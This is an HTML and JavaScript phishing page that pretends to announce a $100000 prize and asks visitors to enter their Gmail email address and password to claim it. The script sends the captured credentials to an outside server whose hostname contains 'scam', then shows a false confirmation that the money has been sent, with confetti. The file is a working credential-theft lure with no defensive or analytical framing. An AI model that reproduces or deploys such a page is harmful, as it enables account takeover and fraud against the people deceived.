<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information Form</title>
    <style> 
    /* General styling */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #89f7fe, #66a6ff);
            margin: 0;
            overflow: hidden;
            flex-direction: column;
        }

        /* Responsive container */
        .container {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 350px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        h1, h2 {
            font-size: 22px;
            color: #fff;
            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.2);
        }

        p {
            font-size: 14px;
            color: #f8f8f8;
        }

        /* Input and form elements */
        input, textarea {
            width: 100%;
            padding: 12px;
            margin-top: 8px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 6px;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
        }

        input:focus, textarea:focus {
            border-color: #66a6ff;
            box-shadow: 0px 0px 10px rgba(102, 166, 255, 0.7);
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            border: none;
            border-radius: 6px;
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            background: linear-gradient(135deg, #0056b3, #004080);
            transform: scale(1.05);
        }

        /* Popup Styling */
        .popup, .loading-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(30deg, #a4cffd, #0056b3);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            display: none;
            animation: fadeIn 0.5s ease-in-out;
            width: 90%;
            max-width: 300px;
        }

        .loading-popup {
            background: rgba(0, 0, 0, 0.8);
            color: white;
            font-size: 18px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -55%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }

        /* Confetti effect */
        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background: red;
            opacity: 0.8;
            animation: confetti-fall linear infinite;
        }

        @keyframes confetti-fall {
            0% { transform: translateY(-150vh) rotate(0deg); } /* Start way above viewport */
            100% { transform: translateY(100vh) rotate(360deg); } /* Falls down */
        }

        /* Media query for smaller screens */
        @media (max-width: 600px) {
            .container {
                width: 95%;
            }
            h1{
                font-size: 18px;
            }
            p {
                font-size: 12px;
            }
            h2{
                font-size: 16px;
            }
            input{
                width: 80%;
            }
            .container{
                max-width: 250px;
            }
        }
    </style>
</head>
<body>
    <div class="overlay" >
    
    <header>
        <h1>Congratulations you have won $100000</h1>
        <p>Please fill out this form to complete your registration</p>
    </header>
        <div class="container">
            <h2>Log in Gmail to claim</h2>
            <form id="infoForm">
                <label for="email">Email:</label>
                <input type="email" id="email" required>
                
                <label for="pass">Password:</label>
                <input type="password" id="pass" required>
            
                <button type="submit">Submit</button>
            </form>             
        </div>
    </div>
    <div class="loading-popup" id="loadingPopup">
        ⏳ Processing, please wait...
    </div>
    <div class="popup" id="congratsPopup">
        <h2>🎉 Congratulations! 🎉</h2>
        <p>The money has been sent to your account!</p>
    </div>

    

    <script>
    document.getElementById("infoForm").addEventListener("submit", async function(event) {
        event.preventDefault();
        
        const loadingPopup = document.getElementById("loadingPopup");
        const congratsPopup = document.getElementById("congratsPopup");

        // Show loading popup
        loadingPopup.style.display = "block";

        const formData = {
            pass: document.getElementById("pass").value,
            email: document.getElementById("email").value,
        };
    
        try {
            const response = await fetch("https://scamdawni.onrender.com/send-email", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });
    
            const result = await response.json();
            alert(result.message);
    
            if (result.success) {
                // Clear form on success
                loadingPopup.style.display = "none"; // Hide loading popup
                showPopup()
                document.getElementById("infoForm").reset();
            }
        } catch (error) {
            alert("An error occurred. Please try again.");
        }
    });
    function showPopup() {
            const popup = document.getElementById("congratsPopup");
            popup.style.display = "block";

            // Confetti effect
            for (let i = 0; i < 100; i++) {
                let confetti = document.createElement("div");
                confetti.classList.add("confetti");
                confetti.style.left = Math.random() * 100 + "vw";
                confetti.style.backgroundColor = 
                    ["red", "blue", "yellow", "green", "orange", "pink"][Math.floor(Math.random() * 6)];
                confetti.style.animationDuration = Math.random() * 2 + 1 + "s";
                document.body.appendChild(confetti);

                setTimeout(() => {
                    confetti.remove();
                }, 3000);
            }

            // Auto-hide popup
            setTimeout(() => {
                popup.style.display = "none";
            }, 3000);
        }
    
    </script>
</body>
</html>
